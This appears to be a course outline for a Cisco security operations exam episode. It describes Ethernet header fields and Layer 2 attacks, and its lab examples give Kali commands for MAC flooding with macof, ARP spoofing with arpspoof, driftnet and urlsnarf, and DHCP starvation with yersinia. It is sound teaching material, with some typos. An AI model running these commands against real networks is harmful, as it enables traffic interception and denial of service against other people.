###Cisco Cybersecurity Operations (Exam 210-255)
============================================================
{FileName}cisco-secops210255-2-2-1-describe_protocol_headers-MMDDYY
{EpisodeName}Describe Protocol Headers Pt.1
{ShowName}Cisco Cybersecurity Operations
{Keywords}Cisco FMC, Wireshark, Cisco IOS Netflow
#### Describe Protocol Headers
* 2.2 Describe the fields in these protocol headers as they
relate to intrusion analysis:
	+ We want to look at Layer 2 (link-layer) header information and understand what attacks occur here.
	+ "What OSI Layers do Filtering, Access Control Lists,
	  Authentication and Application control protect? 
	  Answer, not Layer 2!! 
		- Layer 2 is considered a trusted layer. The 
		  Ethernet Layer header has information about what?
		  Layers 1 and 2. This where ethernet headers come into
		  play.  Remember that there are no fine grain controls
		  at data-link.
		- Many of the attacks rely on lack of authentication at
		  Layer 2 during communications (MITM possible).
	+ Wired attacks at Layer 2: CAM table exhaustion, ARP
	  Spoofing, DHCP Exhaustion, and VLAN hopping.
	+ Wireless attacks at Layer 2: Hidden Node, Deauth, 
	  Fake Access Points.
	+ 2.2.a Ethernet Frame
		- Preamble
			+ Wirehark (not shown)
			+ 7 bytes (56 bit)
			+ Synchronization Bits
			+ Process by NIC
		- Start of Frame (SOF)
			+ 1 byte
		- Destination MAC
			+ 48 bits (6 bytes) reported in hex
			+ 24 bits (OUI) & 24 bits (Serial)
		- Source MAC
			+ 48 bits (6 bytes) rreported in hex
			+ 24 bits (OUT) & 24 bits (Serial)
		- [Frame Type]
			+ Hex Value to indicate upper layer protocol
			  in data field
			+ 0x800 IPv4 Protocol
			+ 0x806 Address Resolution Prootcol ARP
			+ 0x86DD IPv6 Protocol
		- Data
			+ between 46 and 1500 bytes
		- FCS (Frame Check Sequence)
			+ used by the NIC to identify errors during
			  transmission
	+ Example #1 (CAM Table Exhaustion):
``` 
Simple Diagram
Kali Linux Terminal 
Simple Flooding command: macof -i eth1 -n 10
Targeted Floding command: macof -i eth1 -d 192.168.1.1
List and Describe Counter Measures Possible
Port Security
802.1x 
MAC Filtering
``` 
	+ Example #2 (ARP Spoofing):
``` 
Kali Linux setup port forwarding: echo '1' > /proc/sys/net/
ipv4/ip_forward 
arpspoof -i eth0 -t 192.168.8.90 192.168.8.8 
(setup arpspoof from target to kali)
driftnet -i eth0 (Leave window open)--monitoring
urlsnarf -i eth0 (capture website info)
```
	+ Example #3 (DHCP Starvation):
``` 
Setup DHCP on Router
--show ip dhcp server statistics
--show ip dhcp pool
--show ip dhcp bind
Kali Linux Terminal
++yersinia -G (launches yersinia in Graphical mode)
++Click on DHCP Tab
++(on left side) Click Launch Attack
++choose sending DHCP Discover Packet
--show ip dhcp bind
```

[Frame Type]:https://en.wikipedia.org/wiki/EtherType
